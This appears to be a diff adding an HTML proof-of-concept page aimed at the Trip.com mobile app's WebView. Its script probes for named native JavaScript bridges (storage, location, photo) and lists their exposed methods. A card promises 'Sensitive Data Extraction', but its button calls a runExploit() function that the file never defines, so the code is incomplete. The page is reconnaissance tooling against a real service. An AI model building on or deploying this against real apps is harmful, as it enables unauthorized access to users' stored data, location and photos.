@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trip.com Vulnerability PoC - Critical Impact</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 15px; background-color: #f4f4f9; color: #333; line-height: 1.6; }
+        .card { background: white; border-radius: 8px; padding: 15px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border-left: 5px solid #e74c3c; }
+        h3 { margin-top: 0; color: #c0392b; }
+        ul { list-style: none; padding: 0; }
+        li { background: #fee; margin: 5px 0; padding: 8px; border-radius: 4px; border: 1px solid #fcc; font-family: monospace; }
+        .status { font-weight: bold; color: #27ae60; }
+        .log-box { background: #222; color: #0f0; padding: 10px; border-radius: 5px; font-family: 'Courier New', Courier, monospace; min-height: 100px; overflow-x: auto; }
+        button { background: #e74c3c; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #c0392b; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h3>1. Exposed Native Bridges</h3>
+        <p> Bridge</p>
+        <ul id="bridges">Scaning . . . </ul>
+    </div>
+
+    <div class="card" style="border-left-color: #f1c40f;">
+        <h3>2. Sensitive Data Extraction (POC)</h3>
+        <p> Important Data :</p>
+        <div id="logs" class="log-box">Waiting for scan to complete...</div>
+        <br>
+        <button onclick="runExploit()"> Do Again </button>
+    </div>
+
+    <script>
+    function log(message, color = "#0f0") {
+        var logBox = document.getElementById('logs');
+        if(logBox.innerHTML.includes("Waiting")) logBox.innerHTML = "";
+        logBox.innerHTML += "> <span style='color:" + color + "'>" + message + "</span><br>";
+    }
+
+    function discoverBridges() {
+        var bridges = ["Storage_a", "IBUStorageV2_a", "Locate_a", "Photo_a", "Storage"];
+        
+        bridges.forEach(function(b) {
+            if (window[b]) {
+                log("--- Inspecting: " + b + " ---", "yellow");
+                // لیست کردن تمام متدها و ویژگی‌های موجود در این شیء
+                var methods = [];
+                for (var prop in window[b]) {
+                    methods.push(prop);
+                }
+                
+                if (methods.length > 0) {
+                    log("Available Methods: " + methods.join(", "), "#fff");
+                } else {
+                    log("No methods visible. (Check @JavascriptInterface)", "red");
+                }
+            } else {
+                log(b + " not found in window.", "#555");
+            }
+        });
+    }
+
+    setTimeout(discoverBridges, 1500);
+</script>
+</body>
+</html>
